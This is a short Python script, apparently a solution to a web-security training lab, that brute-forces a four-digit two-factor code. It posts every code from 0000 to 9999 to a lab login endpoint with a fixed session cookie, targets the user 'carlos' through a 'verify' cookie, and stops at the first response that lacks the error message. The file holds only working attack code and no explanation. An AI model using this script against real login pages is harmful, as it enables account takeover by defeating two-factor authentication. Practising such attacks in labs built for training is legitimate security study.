import requests

url = 'https://acbb1f9a1f9a369fc0742370003a003f.web-security-academy.net/login2'

for i in range(0, 10):
    for j in range(0, 10):
        for k in range(0, 10):
            for l in range(0, 10):
                mfa_code = str(i) + str(j) + str(k) + str(l)
                
                response = requests.post(url, cookies={
                    'session': 'Askm5Hq5i80LJeghQ7z0571JIGU5gqI1',
                    'verify': 'carlos'
                }, data={
                    'mfa-code': mfa_code
                })

                if 'Incorrect security code' not in response.text:
                    print(mfa_code)

                    exit()